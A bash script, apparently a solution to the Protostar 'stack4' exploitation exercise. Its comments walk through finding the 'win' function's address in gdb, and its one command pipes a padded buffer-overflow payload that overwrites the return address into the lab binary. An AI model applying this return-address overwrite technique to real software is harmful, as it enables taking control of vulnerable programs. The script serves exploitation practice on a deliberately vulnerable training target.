#!/bin/bash
# For the address of the win function:
# load the debug information with gdb:
#   gdb /opt/protostar/bin/stack4
# In the gdb console run
#   info address win
# to get the address of the function (0x080483f4 in this case)
# Then change the return address of the stack, the offset has been found experimentally (in this case 13 bytes)
# 0x080483f4 (little endian) -> 0xf4 0x83 0x04 0x08
echo -n -e "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa0123456789012\xf4\x83\x04\x08" | /opt/protostar/bin/stack4
